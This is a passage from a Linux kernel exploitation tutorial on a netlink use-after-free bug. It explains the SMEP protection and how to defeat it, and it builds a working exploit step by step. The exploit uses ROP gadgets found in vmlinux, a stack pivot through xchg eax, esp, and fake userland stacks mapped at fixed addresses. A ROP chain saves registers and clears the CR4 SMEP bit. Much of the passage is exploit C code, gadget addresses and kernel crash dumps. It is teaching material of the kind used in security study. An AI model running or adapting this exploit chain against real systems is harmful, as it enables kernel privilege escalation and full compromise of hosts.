0x%llx\\n\", PTE_FLAGS_MASK);\nprintf(\"pte             = 0x%llx\\n\", pte);\nprintf(\"pte_flags       = 0x%llx\\n\\n\", pte_flags);\nprintf(\"present   = %d\\n\", !!(pte_flags & (1 << 0)));\nprintf(\"writable  = %d\\n\", !!(pte_flags & (1 << 1)));\nprintf(\"user      = %d\\n\", !!(pte_flags & (1 << 2)));\nprintf(\"acccessed = %d\\n\", !!(pte_flags & (1 << 5)));\nprintf(\"NX        = %d\\n\", !!(pte_flags & (1ULL << 63)));\nreturn 0;\n}\nNOTE: If you wonder where all those constants come from, search for the\nPTE_FLAGS_MASK and _PAGE_BIT_USER macros in\narch\/x86\/include\/asm\/pgtable_types.h. It simply matches the Intel\ndocumentation (Table 4-19).\nThis program gives:\nPTE_FLAGS_MASK  = 0xffffc00000000fff\npte             = 0x111e3025\npte_flags       = 0x25\npresent   = 1\nwritable  = 0\nuser      = 1\nacccessed = 1\nNX        = 0\nLet's match this information with the previous error code:\n1. The page the kernel is trying to access is already present, so the\nfault comes from an access right issue\n2. We are NOT trying to write to a read-only page\n3. The NX bit is NOT set, so the page is executable\n4. The page is user accessible which means, the kernel can also access\nit\nSo, what's wrong?\nIn the previous list, the point 4) is partially true. The kernel has\nthe right to access User Mode pages but it cannot execute it! The\nreason being:\nSupervisor Mode Execution Prevention (SMEP).\nPrior to SMEP introduction, the kernel had all rights to do anything\nwith userland pages. In Supervisor Mode (i.e. Kernel Mode), the kernel\nwas allowed to both read\/write\/execute userland AND kernel pages. This\nis not true anymore!\nSMEP exists since the \"Ivy Bridge\" Intel Microarchitecture (core i7,\ncore i5, etc.) and the Linux kernel supports it since this [42]patch.\nIt adds a security mechanism that is enforced in hardware.\nLet's look at the section \"4.6.1 - Determination of Access Rights\" from\n[43]Intel System Programming Guide Volume 3a which gives the complete\nsequence performed while checking if accessing a memory location is\nallowed or not. If not, a page fault exception is generated.\nSince the fault occurs during the setsockopt() system call, we are in\nsupervisor-mode:\nThe following items detail how paging determines access rights:\n\u2022 For supervisor-mode accesses:\n... cut ...\n\u2014 Instruction fetches from user-mode addresses.\nAccess rights depend on the values of CR4.SMEP:\n\u2022 If CR4.SMEP = 0, access rights depend on the paging mode and the value of\nIA32_EFER.NXE:\n... cut ...\n\u2022 If CR4.SMEP = 1, instructions may not be fetched from any user-mode addres\ns.\nLet's check the status of the CR4 register. The bit in CR4 which\nrepresents the SMEP status is the bit 20:\nCR4 cr4.png\nIn Linux, the following macro is used:\n\/\/ [arch\/x86\/include\/asm\/processor-flags.h]\n#define X86_CR4_SMEP    0x00100000 \/* enable SMEP support *\/\nHence:\nCR4 = 0x00000000001407f0\n^\n+------ SMEP is enabled\nThat's it! SMEP just does its job denying us to return into userland\ncode from kernel land.\nFortunately, SMAP (Supervisor Mode Access Protection), which forbids\naccess to userland page from Kernel Mode, is disabled. It would force\nus to use another exploitation strategy (i.e. can't use a wait queue\nelement in userland).\nWARNING: Some virtualization software (like Virtual Box) does not\nsupport SMEP. We don't know if it supports it at the time of writing.\nIf the SMEP flag is not enabled in your lab, you might consider using\nanother virtualization software (hint: vmware supports it).\nIn this section, we analyzed in deeper detail what information can be\nextracted from a page fault trace. It is important to understand it as\nwe might need to explore it again later on (e.g. prefaulting). In\naddition, we understood why the exception was generated because of SMEP\nand how to detect it. Don't worry, like any security protection\nmechanism, there is a workaround :-).\n__________________________________________________________________\nDefeating SMEP Strategies\nIn the previous section, we tried to jump into userland code to execute\nthe payload of our choice (i.e. arbitrary code execution).\nUnfortunately, we've been blocked by SMEP which provoked an\nunrecoverable page fault making the kernel crash.\nIn this section, we will present different strategies that can be used\nto defeat SMEP.\nDon't ret2user\nThe most obvious way to bypass SMEP is to not return to user code at\nall and keep executing kernel code.\nHowever, it is very unlikely that we find a single function in the\nkernel that:\n* elevates our privileges and\/or other \"profits\"\n* repairs the kernel\n* returns a non-zero value (required by the bug)\nNote in the current exploit, we are not actually bounded to a \"single\nfunction\". The reason is: we control the func field since it is located\nin userland. What we could do here is, calling one kernel function,\nmodifying func and calling another function, etc. However, it brings\ntwo issues:\n1. We can't have the return value of the invoked function\n2. We do not \"directly\" control the invoked function parameters\nThere are tricks to exploit the arbitrary call this way, hence don't\nneed to do any ROP, allowing a more \"targetless\" exploit. Those are\nout-of-topic here as we want to present a \"common\" way to use arbitrary\ncalls.\nJust like userland exploitation, we can use return-oriented programming\ntechnique. The problem is: writing a complex ROP-chain can be tedious\n(yet automatable). This will work nevertheless. Which leads us to...\nDisabling SMEP\nAs we've seen in the previous section, the status of SMEP (CR4.SMEP) is\nchecked during a memory access. More specifically, when the CPU fetches\nan instruction belonging to userspace while in Kernel (Supervisor)\nmode. If we can flip this bit in CR4, we will be able to ret2user\nagain.\nThis is what we will do in the exploit. First, we disable the SMEP bit\nusing ROP, and then jump to user code. This will allow us to write our\npayload in C language.\nret2dir\nThe ret2dir attack exploits the fact that every user page has an\nequivalent address in kernel-land (called \"synonyms\"). Those synonyms\nare located in the physmap. The physmap is a direct mapping of all\nphysical memory. The virtual address of the physmap is\n0xffff880000000000 which maps the page frame number (PFN) zero\n(0xffff880000001000 is PFN#1, etc.). The term \"physmap\" seems to have\nappeared with the ret2dir attack, some people call it \"linear mapping\".\nAlas, it is more complex to do it nowadays because \/proc\/<PID>\/pagemap\nis not world readable anymore. It allowed to find the PFN of userland\npage, hence find the virtual address in the physmap.\nThe PFN of a userland address uaddr can be retrieved by seeking the\npagemap file and read an 8-byte value at offset:\nPFN(uaddr) = (uaddr\/4096) * sizeof(void*)\nIf you want to know more about this attack, see [44]ret2dir: Rethinking\nKernel Isolation.\nOverwriting Paging-Structure Entries\nIf we look again at the Determination of Access Rights (4.6.1) section\nin the Intel documentation, we get:\nAccess rights are also controlled by the mode of a linear address as specified b\ny\nthe paging-structure entries controlling the translation of the linear address.\nIf the U\/S flag (bit 2) is 0 in at least one of the paging-structure entries, th\ne\naddress is a supervisor-mode address. Otherwise, the address is a user-mode addr\ness.\nThe address we are trying to jump to is considered as a user-mode\naddress since the U\/S flag is set.\nOne way to bypass SMEP is to overwrite at least one paging-structure\nentry (PTE, PMD, etc.) and clear bit 2. It implies that we know where\nthis PGD\/PUD\/PMD\/PTE is located in memory. This kind of attack is\neasier to do with an arbitrary read\/write primitives.\n__________________________________________________________________\nFinding Gadgets\nFinding ROP gadgets in Kernel is similar to userland exploitation.\nFirst we need the vmlinux binary and (optionally) the System.map files\nthat we already extracted in [45]part 3. Since vmlinux is an ELF\nbinary, we can use [46]ROPgadget.\nHowever, vmlinux is not a typical ELF binary. It embeds [47]special\nsections. If you look at the various sections using readelf you can see\nthat there are a lot of them:\n$ readelf -l vmlinux-2.6.32\nElf file type is EXEC (Executable file)\nEntry point 0x1000000\nThere are 6 program headers, starting at offset 64\nProgram Headers:\nType           Offset             VirtAddr           PhysAddr\nFileSiz            MemSiz              Flags  Align\nLOAD           0x0000000000200000 0xffffffff81000000 0x0000000001000000\n0x0000000000884000 0x0000000000884000  R E    200000\nLOAD           0x0000000000c00000 0xffffffff81a00000 0x0000000001a00000\n0x0000000000225bd0 0x0000000000225bd0  RWE    200000\nLOAD           0x0000000001000000 0xffffffffff600000 0x0000000001c26000\n0x00000000000008d8 0x00000000000008d8  R E    200000\nLOAD           0x0000000001200000 0x0000000000000000 0x0000000001c27000\n0x000000000001ff58 0x000000000001ff58  RW     200000\nLOAD           0x0000000001247000 0xffffffff81c47000 0x0000000001c47000\n0x0000000000144000 0x0000000000835000  RWE    200000\nNOTE           0x0000000000760f14 0xffffffff81560f14 0x0000000001560f14\n0x000000000000017c 0x000000000000017c         4\nSection to Segment mapping:\nSegment Sections...\n00     .text .notes __ex_table .rodata __bug_table .pci_fixup __ksymtab __ksy\nmtab_gpl __kcrctab __kcrctab_gpl __ksymtab_strings __init_rodata __param __modve\nr\n01     .data\n02     .vsyscall_0 .vsyscall_fn .vsyscall_gtod_data .vsyscall_1 .vsyscall_2 .\nvgetcpu_mode .jiffies .fence_wdog_jiffies64\n03     .data.percpu\n04     .init.text .init.data .x86_cpu_dev.init .parainstructions .altinstruct\nions .altinstr_replacement .exit.text .smp_locks .data_nosave .bss .brk\n05     .notes\nIn particular, it has a .init.text section which seems executable (use\nthe -t modifier):\n[25] .init.text\nPROGBITS               PROGBITS         ffffffff81c47000  000000000124700\n0  0\n000000000004904a 0000000000000000  0                 16\n[0000000000000006]: ALLOC, EXEC\nThis section describes code that is only used during the boot process.\nCode belonging to this section can be retrieved with the __init\npreprocessor macro defined here:\n#define __init      __section(.init.text) __cold notrace\nFor instance:\n\/\/ [mm\/slab.c]\n\/*\n* Initialisation.  Called after the page allocator have been initialised and\n* before smp_init().\n*\/\nvoid __init kmem_cache_init(void)\n{\n\/\/ ... cut ...\n}\nOnce the initialization phase is complete, this code is unmapped from\nmemory. In other words, using a gadget belonging to this section will\nresult in a page fault in kernel land, making it crash (cf. previous\nsection).\nBecause of this (other special executable sections have other traps),\nwe will avoid searching gadgets in those \"special sections\" and limit\nthe research to the \".text\" section only. Start and ending addresses\ncan be found with the _text and _etext symbol:\n$ egrep \" _text$| _etext$\" System.map-2.6.32\nffffffff81000000 T _text\nffffffff81560f11 T _etext\nOr with readelf (-t modifier):\n[ 1] .text\nPROGBITS               PROGBITS         ffffffff81000000  000000000020000\n0  0\n0000000000560f11 0000000000000000  0                 4096\n[0000000000000006]: ALLOC, EXEC\nLet's extract all gadgets with:\n$ .\/ROPgadget.py --binary vmlinux-2.6.32 --range 0xfffffff81000000-0xffffffff815\n60f11 | sort > gadget.lst\nWARNING: Gadgets from [_text; _etext[ aren't 100% guaranteed to be\nvalid at runtime for various reasons. You should inspect memory before\nexecuting the ROP-chain (cf. \"Debugging the kernel with GDB\").\nAlright, we are ready to ROP.\n__________________________________________________________________\nStack Pivoting\nIn the previous sections we saw that:\n* the kernel crashes (page fault) while trying to jump to user-land\ncode because of SMEP\n* SMEP can be disabled by flipping a bit in CR4\n* we can only use gadgets in the .text section and extract them with\nROPgadget\nIn the \"Core Concept #4\" section, we saw that while executing a syscall\ncode, the kernel stack (rsp) is pointing to the current kernel thread\nstack. In this section, we will use our arbitrary call primitive to\npivot the stack to a userland one. Doing so will allow us to control a\n\"fake\" stack and execute the ROP-chain of our choice.\nAnalyze Attacker-Controlled Data\nThe __wake_up_common() function has been analyzed in deeper details in\n[48]part 3. As a reminder, the code is:\nstatic void __wake_up_common(wait_queue_head_t *q, unsigned int mode,\nint nr_exclusive, int wake_flags, void *key)\n{\nwait_queue_t *curr, *next;\nlist_for_each_entry_safe(curr, next, &q->task_list, task_list) {\nunsigned flags = curr->flags;\nif (curr->func(curr, mode, wake_flags, key) &&\n(flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)\nbreak;\n}\n}\nWhich is invoked with (we almost fully control the content of nlk with\nreallocation):\n__wake_up_common(&nlk->wait, TASK_INTERRUPTIBLE, 1, 0, NULL)\nIn particular, our arbitrary call primitive is invoked here:\nffffffff810618f7:       44 8b 20                mov    r12d,DWORD PTR [rax]\n\/\/ \"flags = curr->flags\"\nffffffff810618fa:       4c 89 f1                mov    rcx,r14\n\/\/ 4th arg: \"key\"\nffffffff810618fd:       44 89 fa                mov    edx,r15d\n\/\/ 3nd arg: \"wake_flags\"\nffffffff81061900:       8b 75 cc                mov    esi,DWORD PTR [rbp-0x34]\n\/\/ 2nd arg: \"mode\"\nffffffff81061903:       48 89 c7                mov    rdi,rax\n\/\/ 1st arg: \"curr\"\nffffffff81061906:       ff 50 10                call   QWORD PTR [rax+0x10]\n\/\/ ARBITRARY CALL PRIMITIVE\nLet's relaunch the exploit:\n...\n[+] g_uland_wq_elt addr = 0x602860\n[+] g_uland_wq_elt.func = 0x4014c4\n...\nThe register status when crashing is:\n[  453.993810] RIP: 0010:[<00000000004014c4>]  [<00000000004014c4>] 0x4014c4\n^ &payload()\n[  453.993932] RSP: 0018:ffff88001b527e60  EFLAGS: 00010016\n^ kernel thread stack top\n[  453.994003] RAX: 0000000000602860 RBX: 0000000000602878 RCX: 0000000000000000\n^ curr                ^ &task_list.next     ^ \"key\" arg\n[  453.994086] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000602860\n^ \"wake_flags\" arg    ^ \"mode\" arg          ^ curr\n[  453.994199] RBP: ffff88001b527ea8 R08: 0000000000000000 R09: 00007fc0fa180700\n^ thread stack base   ^ \"key\" arg           ^ ???\n[  453.994275] R10: 00007fffa3c8b860 R11: 0000000000000202 R12: 0000000000000001\n^ ???                 ^ ???                 ^ curr->flags\n[  453.994356] R13: ffff88001bdde6b8 R14: 0000000000000000 R15: 0000000000000000\n^ nlk->wq [REALLOC]   ^ \"key\" arg           ^ \"wake_flags\" a\nrg\nWow... It seems we are really lucky! Both rax, rbx and rdi point to our\nuserland wait queue element. Of course, this is not fortuitous. It is\nanother reason why we choose this arbitrary call primitive in the first\nplace.\nThe Pivot\nRemember the stack is only defined by the rsp register. Let's use one\nof our controlled registers to overwrite it. A common gadget used in\nthis kind of situation is:\nxchg rsp, rXX ; ret\nIt exchanges the value of rsp with a controlled register while saving\nit. Hence, it helps to restore the stack pointer afterward.\nNOTE: You might use a mov gadget instead but you will lose the current\nstack pointer value, hence not be able to repair the stack afterward.\nThis is not exactly true... You can repair it by using RBP or the\nkernel_stack variable (cf. Core Concepts #4) and add a \"fixed offset\"\nsince the stack layout is known and deterministic. The xchg instruction\njust make things simpler.\n$ egrep \"xchg [^;]*, rsp|xchg rsp, \" ranged_gadget.lst.sorted\n0xffffffff8144ec62 : xchg rsi, rsp ; dec ecx ; cdqe ; ret\nLooks like we only have 1 gadget that does this in our kernel image. In\naddition, the rsi value is 0x0000000000000001 (and we can't control\nit). This implies mapping a page at address zero which is not possible\nanymore to prevent \"NULL-deref\" bugs exploitation.\nLet's extend the research to the \"esp\" register which brings much more\nresults:\n$ egrep \"(: xchg [^;]*, esp|: xchg esp, ).*ret$\" ranged_gadget.lst.sorted\n...\n0xffffffff8107b6b8 : xchg eax, esp ; ret\n...\nHowever, the xchg instruction here works on 32-bit registers. That is,\nthe 32 most significant bits will be zeroed!\nIf you are not convinced yet, just run (and debug) the following\nprogram:\n# Build-and-debug with: as test.S -o test.o; ld test.o; gdb .\/a.out\n.text\n.global _start\n_start:\nmov $0x1aabbccdd, %rax\nmov $0xffff8000deadbeef, %rbx\nxchg %eax, %ebx                 # <---- check \"rax\" and \"rbx\" past this instru\nction (gdb)\nThat is, after executing the stack pivot gadget, the 64-bit registers\nbecome:\n* rax = 0xffff88001b527e60 & 0x00000000ffffffff = 0x000000001b527e60\n* rsp = 0x0000000000602860 & 0x00000000ffffffff = 0x0000000000602860\nThis is actually not a problem because of the virtual address mapping\nwhere userland address ranges from 0x0 to 0x00007ffffffff000 (cf. Core\nConcept #4). In other words, any 0x00000000XXXXXXXX address is a valid\nuserland one.\nThe stack is now pointing to userland where we can control data and\nstarts our ROP chain. The register state before and after executing the\nstack pivot gadget are:\nBefore\/After Stack Pivot stack_pivot.png\nERRATA: RSP is pointing 8 bytes after RDI since the ret instruction\n\"pop\" a value before executing it (i.e. should point to private).\nPlease see the next section.\nNOTE: rax is pointing in a \"random\" userland address since it only\nholds the lowest significant bytes of the previous rsp value.\nDealing with Aliasing\nBefore going further there are few things to consider:\n* the new \"fake\" stack is now aliasing with the wait queue element\nobject (in userland).\n* since the 32 highest significant bits are zero'ed, the fake stack\nmust be mapped at an address lower than 0x100000000.\nRight now, the g_uland_wq_elt is declared globally (i.e. the bss). Its\naddress is \"0x602860\" which is lower than 0x100000000.\nAliasing can be an issue as it:\n* forces us to use a stack lifting gadget to \"jump over\" the func\ngadget (i.e. don't execute the \"stack pivot\" gadget again)\n* imposes constraints on the gadgets as the wait queue element must\nstill be valid (in __wake_up_common())\nThere are two ways to deal with this \"aliasing\" issue:\n1. Keep the fake stack and wait queue aliased and use a stack lifting\nwith constrained gadgets\n2. Move g_uland_wq_elt into \"higher\" memory (after the 0x100000000\nmark).\nBoth techniques works.\nFor instance, if you want to implement the first way (we won't), the\nnext gadget address must have its lowest significant bits set because\nof the break condition in __wake_up_common():\n(flags & WQ_FLAG_EXCLUSIVE)   \/\/ WQ_FLAG_EXCLUSIVE == 1\nIn this particular example, this first condition can be easily\novercomed by using a NOP gadget which has its least significant bit\nset:\n0xffffffff8100ae3d : nop ; nop ; nop ; ret    \/\/ <---- valid gadget\n0xffffffff8100ae3e : nop ; nop ; ret          \/\/ <---- BAD GADGET\nInstead, we will implement the second as we think it is more\n\"interesting\", less gadget-dependent and exposes a technique that is\nsometimes used during exploit (having addresses relative to each\nother). In addition, we will have more choices in our ROP-chain gadgets\nas they will be less constrained because of the aliasing.\nIn order to declare our (userland) wait queue elements at an arbitrary\nlocation, we will use the mmap() syscall with the MAX_FIXED argument.\nWe will do the same for the \"fake stack\". Both are linked with the\nfollowing property:\nULAND_WQ_ADDR = FAKE_STACK_ADDR + 0x100000000\nIn other words:\n(ULAND_WQ_ADDR & 0xffffffff) == FAKE_STACK_ADDR\n^ pointed by RAX before XCHG   ^ pointed by RSP after XCHG\nThis is implemented in allocate_uland_structs():\nstatic int allocate_uland_structs(void)\n{\n\/\/ arbitrary value, must not collide with already mapped memory (\/proc\/<PID>\/m\naps)\nvoid *starting_addr = (void*) 0x20000000;\n\/\/ ... cut ...\ng_fake_stack = (char*) _mmap(starting_addr, 4096, PROT_READ|PROT_WRITE,\nMAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);\n\/\/ ... cut ...\ng_uland_wq_elt = (struct wait_queue*) _mmap(g_fake_stack + 0x100000000, 4096,\nPROT_READ|PROT_WRITE,\nMAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);\n\/\/ ... cut ...\n}\nWARNING: Using MAP_FIXED might \"overlap\" existing memory! For a better\nimplementation, we should check that the starting_addr address is not\nalready used (e.g. check \/proc\/<PID>\/maps)! Look at the mmap() syscall\nimplementation, you will learn a lot. This is a great exercise.\nThat is, after executing the \"stack pivot gadget\", our exploit memory\nlayout will be:\nAliasing Tricks aliasing.png\nLet's update the exploit code (warning: g_uland_wq_elt is a pointer\nnow, edit the code accordingly):\n\/\/ 'volatile' forces GCC to not mess up with those variables\nstatic volatile struct list_head  g_fake_next_elt;\nstatic volatile struct wait_queue *g_uland_wq_elt;\nstatic volatile char *g_fake_stack;\n\/\/ kernel functions addresses\n#define PANIC_ADDR ((void*) 0xffffffff81553684)\n\/\/ kernel gadgets in [_text; _etext]\n#define XCHG_EAX_ESP_ADDR ((void*) 0xffffffff8107b6b8)\nstatic int payload(void);\n\/\/ ----------------------------------------------------------------------------\nstatic void build_rop_chain(uint64_t *stack)\n{\nmemset((void*)stack, 0xaa, 4096);\n*stack++ = 0;\n*stack++ = 0xbbbbbbbbbbbbbbbb;\n*stack++ = 0xcccccccccccccccc;\n*stack++ = 0xdddddddddddddddd;\n\/\/ FIXME: implement the ROP-chain\n}\n\/\/ ----------------------------------------------------------------------------\nstatic int allocate_uland_structs(void)\n{\n\/\/ arbitrary value, must not collide with already mapped memory (\/proc\/<PID>\/m\naps)\nvoid *starting_addr = (void*) 0x20000000;\nsize_t max_try = 10;\nretry:\nif (max_try-- <= 0)\n{\nprintf(\"[-] failed to allocate structures at fixed location\\n\");\nreturn -1;\n}\nstarting_addr += 4096;\ng_fake_stack = (char*) _mmap(starting_addr, 4096, PROT_READ|PROT_WRITE,\nMAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);\nif (g_fake_stack == MAP_FAILED)\n{\nperror(\"[-] mmap\");\ngoto retry;\n}\ng_uland_wq_elt = (struct wait_queue*) _mmap(g_fake_stack + 0x100000000, 4096,\nPROT_READ|PROT_WRITE,\nMAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);\nif (g_uland_wq_elt == MAP_FAILED)\n{\nperror(\"[-] mmap\");\nmunmap((void*)g_fake_stack, 4096);\ngoto retry;\n}\n\/\/ paranoid check\nif ((char*)g_uland_wq_elt != ((char*)g_fake_stack + 0x100000000))\n{\nmunmap((void*)g_fake_stack, 4096);\nmunmap((void*)g_uland_wq_elt, 4096);\ngoto retry;\n}\nprintf(\"[+] userland structures allocated:\\n\");\nprintf(\"[+] g_uland_wq_elt = %p\\n\", g_uland_wq_elt);\nprintf(\"[+] g_fake_stack   = %p\\n\", g_fake_stack);\nreturn 0;\n}\n\/\/ ----------------------------------------------------------------------------\nstatic int init_realloc_data(void)\n{\n\/\/ ... cut ...\nnlk_wait->task_list.next = (struct list_head*)&g_uland_wq_elt->task_list;\nnlk_wait->task_list.prev = (struct list_head*)&g_uland_wq_elt->task_list;\n\/\/ ... cut ...\ng_uland_wq_elt->func = (wait_queue_func_t) XCHG_EAX_ESP_ADDR; \/\/ <----- STACK\nPIVOT!\n\/\/ ... cut ...\n}\n\/\/ ----------------------------------------------------------------------------\nint main(void)\n{\n\/\/ ... cut ...\nprintf(\"[+] successfully migrated to CPU#0\\n\");\nif (allocate_uland_structs())\n{\nprintf(\"[-] failed to allocate userland structures!\\n\");\ngoto fail;\n}\nbuild_rop_chain((uint64_t*)g_fake_stack);\nprintf(\"[+] ROP-chain ready\\n\");\n\/\/ ... cut ...\n}\nAs you might have noticed in build_rop_chain(), we setup an invalid\ntemporary ROP-chain just for debugging purpose. The first gadget\naddress being \"0x00000000\", it will provoke a double fault.\nLet's launch the exploit:\n...\n[+] userland structures allocated:\n[+] g_uland_wq_elt = 0x120001000\n[+] g_fake_stack   = 0x20001000\n[+] g_uland_wq_elt.func = 0xffffffff8107b6b8\n...\n[   79.094437] double fault: 0000 [#1] SMP\n[   79.094738] CPU 0\n...\n[   79.097909] RIP: 0010:[<0000000000000000>]  [<(null)>] (null)\n[   79.097980] RSP: 0018:0000000020001008  EFLAGS: 00010012\n[   79.098024] RAX: 000000001c123e60 RBX: 0000000000602c08 RCX: 0000000000000000\n[   79.098074] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000120001000\n[   79.098124] RBP: ffff88001c123ea8 R08: 0000000000000000 R09: 00007fa46644f700\n[   79.098174] R10: 00007fffd73a4350 R11: 0000000000000206 R12: 0000000000000001\n[   79.098225] R13: ffff88001c999eb8 R14: 0000000000000000 R15: 0000000000000000\n...\n[   79.098907] Stack:\n[   79.098954]  bbbbbbbbbbbbbbbb cccccccccccccccc dddddddddddddddd aaaaaaaaaaaaa\naaa\n[   79.099209] <d> aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaa\naaaaaa\n[   79.100516] <d> aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaa\naaaaaa\n[   79.102583] Call Trace:\n[   79.103844] Code:  Bad RIP value.\n[   79.104686] RIP  [<(null)>] (null)\n[   79.105332]  RSP <0000000020001008>\n...\nPerfect, just as expected! RSP is pointing to the second gadget of our\nROP-chain in our fake stack. It double-faulted while trying to execute\nthe first one which points at address zero (RIP=0).\nRemember, ret first \"pops\" the value into rip and THEN executes it!\nThat is why, RSP is pointing to the second gadget (not the first one).\nWe are now ready to write the real ROP-chain!\nNOTE: Forcing a double-fault is a good way to debug a ROP-chain as it\nwill crash the kernel and dump both the registers and the stack. This\nis the \"poor man\" breakpoint :-).\n__________________________________________________________________\nDebugging the kernel with GDB\nDebugging a kernel (without SystemTap) might be an intimidating thing\nto the new comers. In the previous articles we already saw different\nways to debug the kernel:\n* SystemTap\n* netconsole\nHowever, sometimes you want to debug more \"low-level\" stuff and go\nstep-by-step.\nJust like any other binary (Linux being an ELF) you can use GDB to\ndebug it.\nMost virtualization solutions setup a gdb server that you can connect\nto debug a \"guest\" system. For instance, while running a 64-bit kernel,\nvmware setup a gdbserver on port \"8864\". If not, please read the\nmanual.\nBecause of the chaotic\/concurrent nature of a kernel, you might want to\nlimit the number of CPU to one while debugging.\nLet's suppose we want to debug the arbitrary call primitive. One would\nbe tempted to setup a breakpoint just before the call (i.e. \"call\n[rax+0x10]\")... don't! The reason is, a lot of kernel paths (including\ninterrupts handler) actually call this code. That is, you will be\nbreaking all time without being in your own path.\nThe trick is to set a breakpoint earlier (callstack-wise) on a \"not so\nused\" path that is very specific to your bug\/exploit. In our case, we\nwill break in netlink_setsockopt() just before the call to __wake_up()\n(located at address 0xffffffff814b81c7):\n$ gdb .\/vmlinux-2.6.32 -ex \"set architecture i386:x86-64\" -ex \"target remote:886\n4\" -ex \"b * 0xffffffff814b81c7\" -ex \"continue\"\nRemember that our exploit reaches this code 3 times: two to unblock the\nthread and one to reach the arbitrary call. That is, use continue until\nthe 3rd break then do a step-by-step debugging (with \"ni\" and \"si\"). In\naddition, __wake_up() issues another call before __wake_up_common(),\nyou might want to use finish.\nFrom here, this is just a \"normal\" debugging session.\nWARNING: Remember to detach before leaving gdb. Otherwise, it can lead\nto \"strange\" issues that confuse your virtualization tool.\n__________________________________________________________________\nThe ROP-Chain\nIn the previous section, we analyzed the machine state (i.e. registers)\nprior to using the arbitrary call primitive. We found a gadget that\npivot the stack with the xchg instruction that uses 32-bit registers.\nBecause of it, the \"new stack\" and our userland wait queue element\naliased. In order to deal with it, we use a simple trick to avoid this\naliasing and still pivoting to a userland stack. This helps to relax\nthe constraints on future gadgets, avoid stack lifting, etc.\nIn this section, we will build a ROP-chain that:\n* Stores ESP and RBP in userland memory for future restoration\n* Disables SMEP by flipping the corresponding CR4 bit (cf. Defeating\nSMEP Strategies)\n* Jumps to the payload's wrapper\nNote that the things done here are very similar to what is done in\n\"userland\" ROP exploitation. In addition, this is very target\ndependent. You might have better or worse gadgets. This is just the\nROP-chain we built with gadgets available in our target.\nWARNING: It is very rare, but it can happen that the gadget you are\ntrying to use will not work during runtime for some reason (e.g.\ntrampoline, kernel hooks, unmapped). In order to prevent this, break\nbefore executing the ROP-chain and check with gdb that your gadgets are\nas expected in memory. Otherwise, simply choose another one.\nWARNING-2: If your gadgets modify \"non-scratch\" registers (as we do\nwith rbp\/rsp) you will need to repair them by the end of your\nROP-chain.\nUnfortunate \"CR4\" gadgets\nDisabling SMEP will not be the first \"sub-chain\" of our ROP chain (we\nwill save ESP beforehand). However, because of the available gadgets\nthat modify cr4, we will need additional gadgets to load\/store RBP:\n$ egrep \"cr4\" ranged_gadget.lst\n0xffffffff81003288 : add byte ptr [rax - 0x80], al ; out 0x6f, eax ; mov cr4, rd\ni ; leave ; ret\n0xffffffff81003007 : add byte ptr [rax], al ; mov rax, cr4 ; leave ; ret\n0xffffffff8100328a : and bh, 0x6f ; mov cr4, rdi ; leave ; ret\n0xffffffff81003289 : and dil, 0x6f ; mov cr4, rdi ; leave ; ret\n0xffffffff8100328d : mov cr4, rdi ; leave ; ret                       \/\/ <-----\nwill use this\n0xffffffff81003009 : mov rax, cr4 ; leave ; ret                       \/\/ <-----\nwill use this\n0xffffffff8100328b : out 0x6f, eax ; mov cr4, rdi ; leave ; ret\n0xffffffff8100328c : outsd dx, dword ptr [rsi] ; mov cr4, rdi ; leave ; ret\nAs we can see, all of those gadgets have a leave instruction preceding\nthe ret. It means that using them will overwrite both RSP and RBP which\ncan break our ROP-chain. Because of this, we will need to save and\nrestore them.\nSave ESP\/RBP\nIn order to save the value of ESP and RSP we will use four gadgets:\n0xffffffff8103b81d : pop rdi ; ret\n0xffffffff810621ff : shr rax, 0x10 ; ret\n0xffffffff811513b3 : mov dword ptr [rdi - 4], eax ; dec ecx ; ret\n0xffffffff813606d4 : mov rax, rbp ; dec ecx ; ret\nSince our gadget which writes at arbitrary memory location read value\nfrom \"eax\" (32-bits), we use the shr gadget to store the value of RBP\nin two times (low and high bits). The ROP-chains are declared here:\n\/\/ gadgets in [_text; _etext]\n#define XCHG_EAX_ESP_ADDR         ((uint64_t) 0xffffffff8107b6b8)\n#define MOV_PTR_RDI_MIN4_EAX_ADDR ((uint64_t) 0xffffffff811513b3)\n#define POP_RDI_ADDR              ((uint64_t) 0xffffffff8103b81d)\n#define MOV_RAX_RBP_ADDR          ((uint64_t) 0xffffffff813606d4)\n#define SHR_RAX_16_ADDR           ((uint64_t) 0xffffffff810621ff)\n\/\/ ROP-chains\n#define STORE_EAX(addr) \\\n*stack++ = POP_RDI_ADDR; \\\n*stack++ = (uint64_t)addr + 4; \\\n*stack++ = MOV_PTR_RDI_MIN4_EAX_ADDR;\n#define SAVE_ESP(addr) \\\nSTORE_EAX(addr);\n#define SAVE_RBP(addr_lo, addr_hi) \\\n*stack++ = MOV_RAX_RBP_ADDR;  \\\nSTORE_EAX(addr_lo); \\\n*stack++ = SHR_RAX_16_ADDR; \\\n*stack++ = SHR_RAX_16_ADDR; \\\nSTORE_EAX(addr_hi);\nLet's edit build_rop_chain():\nstatic volatile uint64_t saved_esp;\nstatic volatile uint64_t saved_rbp_lo;\nstatic volatile uint64_t saved_rbp_hi;\nstatic void build_rop_chain(uint64_t *stack)\n{\nmemset((void*)stack, 0xaa, 4096);\nSAVE_ESP(&saved_esp);\nSAVE_RBP(&saved_rbp_lo, &saved_rbp_hi);\n*stack++ = 0; \/\/ force double-fault\n\/\/ FIXME: implement the ROP-chain\n}\nBefore proceeding, you may want to be sure that everything goes well up\nto this point. Use GDB as explained in the previous section!\nRead\/Write CR4 and dealing with \"leave\"\nAs mentioned before, all our gadgets that manipulate CR4 have a leave\ninstruction before the ret. Which does (in this order):\n1. RSP = RBP\n2. RBP = Pop()\nIn this ROP-chain, we will use three gadgets:\n0xffffffff81003009 : mov rax, cr4 ; leave ; ret\n0xffffffff8100328d : mov cr4, rdi ; leave ; 